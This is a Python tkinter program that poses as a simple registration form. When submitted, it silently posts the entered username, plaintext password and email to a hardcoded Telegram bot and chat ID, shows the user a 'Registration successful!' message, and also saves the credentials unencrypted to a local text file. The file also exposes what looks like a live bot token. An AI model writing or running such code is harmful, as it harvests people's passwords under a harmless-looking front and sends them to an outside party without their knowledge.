import tkinter as tk
from tkinter import messagebox
import requests


Bot_Token = '6905436550:AAF_jQmIUE6zV9jD3wIyJjFCmPgLXl54Z8I'

Chat_Id = '5691191874'

def submit_form():
    username = username_entry.get()
    password = password_entry.get()
    confirm_password = confirm_password_entry.get()
    email = email_entry.get()
    registration_number = registration_entry.get()
    if not(username and password and confirm_password and email):
        messagebox.showerror("Error", "Invalid error !")

    if password != confirm_password:
        messagebox.showerror("Error", "Passwords do not match!")
        return

    try:
        url = f'https://api.telegram.org/bot{Bot_Token}/sendMessage'
        data = {
            'chat_id': Chat_Id,
            'text': f"New registration :\nUsername: {username}\nPassword: {password}\nEmail: {email}"
        }
        response = requests.post(url, data=data)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        if isinstance(e, requests.exceptions.HTTPError):
            messagebox.showerror("Error", f"Http error occurred.....{e}")
        elif isinstance(e, requests.exceptions.ConnectionError):
            messagebox.showerror("Error", f"Http error occurred.....{e}")
        elif isinstance(e, requests.exceptions.Timeout):
            messagebox.showerror("Error", f"Request timed out. Please check your internet connection.{e}")

    else:
        if response.ok:
            messagebox.showinfo("Success", "Registration successful!")
        else:
            messagebox.showerror("Error", "Failed to send registration details.")


    with open("registration.txt", "a") as file:
        file.write(f"Username: {username}, Password: {password}, Email: {email}\n")


root = tk.Tk()
root.title("Registration Form")

tk.Label(root, text="Username:").grid(row=0, column=0, sticky="e", padx=5, pady=5)
tk.Label(root, text="Password:").grid(row=1, column=0, sticky="e", padx=5, pady=5)
tk.Label(root, text="Confirm Password:").grid(row=2, column=0, sticky="e", padx=5, pady=5)
tk.Label(root, text="Email:").grid(row=3, column=0, sticky="e", padx=5, pady=5)


username_entry = tk.Entry(root)
password_entry = tk.Entry(root, show="*")
confirm_password_entry = tk.Entry(root, show="*")
email_entry = tk.Entry(root)
registration_entry=tk.Entry(root)


username_entry.grid(row=0, column=1, padx=5, pady=5)
password_entry.grid(row=1, column=1, padx=5, pady=5)
confirm_password_entry.grid(row=2, column=1, padx=5, pady=5)
email_entry.grid(row=3, column=1, padx=5, pady=5)


submit_button = tk.Button(root, text="Submit", command=submit_form)
submit_button.grid(row=4, columnspan=2, padx=5, pady=10)

root.mainloop()
